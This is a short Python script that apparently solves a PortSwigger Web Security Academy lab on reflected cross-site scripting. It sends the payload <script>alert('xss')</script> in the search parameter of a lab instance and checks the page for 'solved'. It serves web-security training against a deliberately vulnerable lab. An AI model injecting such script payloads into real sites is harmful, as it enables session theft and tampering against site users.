'''
This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function.

Lab link: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
'''

import requests


lab_id = '0a730009046f3b8080e262c600ea006a' #change based on generated lab
payload = "<script>alert('xss')</script>" # search parameter is vulnerable to reflected XSS
uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 

r = requests.get(uri)
if "solved" in r.text:
    print("solved")
else:
    print("nope")